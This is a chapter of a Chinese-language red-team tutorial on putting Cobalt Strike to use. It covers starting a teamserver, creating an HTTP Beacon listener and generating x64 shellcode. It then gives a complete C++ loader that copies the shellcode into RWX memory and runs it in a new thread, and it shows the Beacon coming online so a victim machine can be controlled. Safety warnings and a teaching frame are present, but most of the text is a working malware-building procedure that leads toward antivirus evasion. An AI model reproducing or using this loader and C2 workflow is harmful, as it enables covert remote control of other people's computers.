在上一章中，我们通过编写 Loader 成功弹出了一个计算器或提示框。这证明了我们拥有了在内存中执行任意代码的能力。

现在，我们要把这个“弹窗”换成真正的红队核心功能——**远程控制**。

我们将介绍红队圈子里无人不知的“神器”：**Cobalt Strike (简称 CS)**。

---

### 🚨 严重警告：保命须知 (必读) {#严重警告保命须知-必读}

在开始之前，请务必再次阅读以下三条铁律，这关乎你的个人安全：

1. **必须在虚拟机中运行：** Cobalt Strike 是收费商业软件，市面上流传的“破解版”、“汉化版” **99% 都被黑客植入了后门**。如果你在宿主机上运行它，你的所有密码和文件可能瞬间失窃。请务必在 **断网的虚拟机** 中运行服务端。
2. **切勿用于实战：** 原版 Cobalt Strike 的流量特征极其明显，全网的安全设备都认识它。在没有进行复杂的二次开发（魔改）之前，直接拿去攻击有防护的目标等同于“自投罗网”。
3. **仅用于教学：** 我们使用 CS 是因为它界面友好、功能强大，是学习 C2 逻辑的最佳教材。

---

### 1. 什么是 Cobalt Strike？ {#h-1-什么是-cobalt-strike}

Cobalt Strike 是一个为红队行动设计的 **C2 (Command and Control) 框架**。

- **Teamserver (服务端)：** 运行在 Linux 上，负责管理所有“僵尸”机器，是团队的大脑。
- **Client (客户端)：** 运行在 Windows/Mac/Linux 上，提供图形化界面，供你操作。
- **Beacon (信标)：** 运行在受害者内存中的植入物（Implant）。它不像传统木马那样一直连着服务器，而是像心跳一样，每隔一段时间“醒来”问一下服务器：“老大，有新任务吗？”

### 2. 启动你的 Teamserver {#h-2-启动你的-teamserver}

假设你已经在一个安全的、隔离的 Kali Linux 或 Ubuntu 虚拟机中配置好了环境。

**启动服务端命令：**

```bash
# 语法: ./teamserver <本机的IP地址> <连接密码>
sudo ./teamserver 192.168.x.x 123456
```

**连接客户端：**<br> 在 Windows 虚拟机中运行 `cobaltstrike.bat` (或在 Linux 下运行 `.sh`)，输入 IP 和密码，连接成功后你会看到一个黑客风格的仪表盘。

---

### 3. 建立监听器 (Listener) {#h-3-建立监听器-listener}

要让木马能连回来，我们需要先在服务器上张开“耳朵”。

1. 点击菜单栏的 **Cobalt Strike -> Listeners**。
2. 点击下方的 **Add**。
3. **Name:** 随便填，比如 `http_listener`。
4. **Payload:** 选择 `Beacon HTTP` (最基础的 HTTP 协议反向连接)。
5. **HTTP Hosts:** 填写你的 Teamserver IP。
6. 点击 **Save**。

现在，你的服务器已经准备好接收“心跳”了。

---

### 4. 生成 Shellcode (制造子弹) {#h-4-生成-shellcode-制造子弹}

还记得我们上一章手写的那个 `0x33, 0xc9...` 数组吗？现在我们不需要手写了，让 CS 帮我们生成一段功能强大的 Shellcode。

1. 点击菜单栏 **Attacks -> Packages -> Payload Generator**。
2. **Listener:** 选择刚才创建的 `http_listener`。
3. **Output:** 选择 **C** (这很重要，因为我们的 Loader 是 C/C++ 写的)。
4. **Architecture:** 勾选 **x64** (现代系统通常用 64 位，**注意：这决定了你后面的 VS 项目也要选 x64**)。
5. 点击 **Generate**，保存为 `payload.c`。

打开这个文件，你会看到熟悉的一幕：

```c
/* length: 892 bytes */
unsigned char buf[] = "\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00...";
```

这就是你的**Shellcode**。它不再是弹窗，而是包含了完整的网络连接和控制逻辑。

---

### 5. 实战装填：用 Loader 加载 CS Shellcode {#h-5-实战装填用-loader-加载-cs-shellcode}

现在，回到我们的 **Visual Studio**。打开上一章编写的 **`VirtualAlloc` 版 Loader**。

我们需要做两个关键修改：

#### 修改一：替换 Shellcode 数组 {#修改一替换-shellcode-数组}

把 `payload.c` 里生成的那个巨大的字符串数组，整理成逗号分隔的格式（或者直接粘贴进去，根据格式微调），替换掉原本的 MessageBox Shellcode。

> **💡 小技巧：** CS 生成的默认是字符串格式 `"\xfc\xe8..."`。C/C++ 编译器完全支持这种写法，你不需要非得把它改成 `{0xfc, 0xe8...}` 这种逗号分隔格式，直接粘贴字符串即可。

#### 修改二：调整项目架构 {#修改二调整项目架构}

如果你在 CS 里选了 **x64**，请务必把 VS 顶部的解决方案平台从 **x86** 改为 **x64**！否则程序会直接崩溃。

**代码示例 (替换后)：**

```cpp
#include <windows.h>
#include <stdio.h>

// 这里放入 CS 生成的 x64 Shellcode
unsigned char shellcode[] =
    "\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\x41\x51\x41\x50\x52\x51"
    "\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52"
    // ... (省略几百行) ...
    "\x5e\x2e\x32\x2e\x31\x30\x00"; // 假设这是结尾

int main() {
    printf("[*] 正在申请 RWX 内存...\n");

    // 1. 申请内存
    LPVOID exec_mem = VirtualAlloc(
        NULL,
        sizeof(shellcode),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE  // <-- 这是主要的特征点！
    );

    if (exec_mem == NULL) {
        printf("[-] 内存分配失败！\n");
        return -1;
    }
    printf("[+] 内存分配成功，地址: 0x%p\n", exec_mem);

    // 2. 复制 Shellcode
    RtlMoveMemory(exec_mem, shellcode, sizeof(shellcode));
    printf("[+] Shellcode 已写入内存\n");

    // 3. 执行代码
    HANDLE hThread = CreateThread(
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)exec_mem,
        NULL,
        0,
        NULL
    );

    if (hThread == NULL) {
        printf("[-] 线程创建失败！\n");
        return -1;
    }
    printf("[+] 线程已创建，等待弹窗...\n");

    // 等待子线程执行完毕，防止主程序提前退出
    WaitForSingleObject(hThread, INFINITE);

    return 0;
}
```

### 6. 见证时刻：Beacon 上线 {#h-6-见证时刻beacon-上线}

1. 在 Visual Studio 中选择 **Release / x64**，点击 **生成 (Build)**。
2. 将生成的 `.exe` 文件拷贝到你的**测试虚拟机**中（不要在宿主机运行！）。
3. 双击运行。

**回到你的 Cobalt Strike 客户端界面：**

如果一切顺利，几秒钟后，你会看到界面上出现了一行新的记录，包含目标 IP、用户名、PID 等信息，并且图标在闪烁。

**恭喜！你成功上线了一台 Beacon！** 🎉

你现在右键点击这台机器，选择 `Interact`，在控制台输入 `shell whoami`，就能看到目标机器返回了当前用户名。

### 🎯 总结 {#总结}

你刚刚完成了一次标准的红队开发流程：

1. **C2 准备：** 搭建 Cobalt Strike 基础设施。
2. **武器化 (Weaponization)：** 提取 CS 的 Shellcode（核心逻辑）。
3. **载荷开发 (Delivery)：** 使用自定义 Loader（外壳）包裹 Shellcode。
4. **上线：** 和受害主机建立连接。

**但是，** 如果你现在的 Loader 遇到真正的杀毒软件，依然会被秒杀。因为 `VirtualAlloc` + `RWX` + `CS原始Shellcode` 的特征太明显了。
